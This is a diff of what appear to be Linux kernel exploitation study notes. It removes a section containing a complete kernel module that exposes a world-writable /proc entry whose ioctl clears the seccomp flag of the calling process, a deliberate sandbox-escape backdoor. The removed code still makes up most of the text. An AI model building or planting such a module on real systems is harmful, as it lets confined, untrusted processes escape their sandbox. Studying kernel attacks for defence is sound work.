@@ -1,4 +1,4 @@
-# x64 Kernel
+# Basic Concept
 
 ## 5.4 Module Example
 
@@ -205,70 +205,6 @@ void cleanup_module(void) {
 ```
 
 
-### Seccopme Escape (For Current Process)
-
-```c
-#include <linux/module.h>
-#include <linux/kernel.h>
-#include <linux/fs.h>
-#include <linux/uaccess.h>
-#include <linux/proc_fs.h>
-#include <linux/cred.h>
-
-#define PWN _IO('P', 0)
-
-MODULE_LICENSE("GPL");
-
-
-static int device_open(struct inode *inode, struct file *filp) {
-    printk(KERN_ALERT "Device Opened\n");
-    return 0;
-}
-
-static int device_release(struct inode *inode, struct file *filp) {
-    printk(KERN_ALERT "Device Closed\n");
-    return 0;
-}
-
-static ssize_t device_read(struct file *filp, char *buf, size_t len, loff_t *offset) {
-    return -EINVAL;
-}
-
-static ssize_t device_write(struct file *filp, const char *buf, size_t len, loff_t *offset) {
-    return -EINVAL;
-}
-
-static long device_ioctl(struct file *filp, unsigned int ioctl_num, unsigned long ioctl_param) {
-    printk(KERN_ALERT "ioctl Call : %d", ioctl_num);
-    if (ioctl_num == PWN) {
-        printk(KERN_ALERT "Escaping seccomp");
-        current->thread_info.flags &= ~_TIF_SECCOMP;
-    }
-    return 0;
-}
-
-static struct file_operations fops = {
-    .read = device_read, 
-    .write = device_write, 
-    .unlocked_ioctl = device_ioctl,
-    .open = device_open, 
-    .release = device_release
-};
-
-struct proc_dir_entry *proc_entry = NULL;
-
-
-int init_module(void) {
-    proc_entry = proc_create("escape-seccomp", 0666, NULL, &fops);
-    return 0;
-}
-
-void cleanup_module(void) {
-    if (proc_entry) proc_remove(proc_entry);
-}
-```
-
-
 ---
 ## Cheat Sheet
 
@@ -302,6 +238,7 @@ iounmap(temp_virt_addr);
 // This is the virtual address maps to the physical address that CR3 point to
 current->mm->pgd;
 ```
+
 
 ---
 ## Mitigations
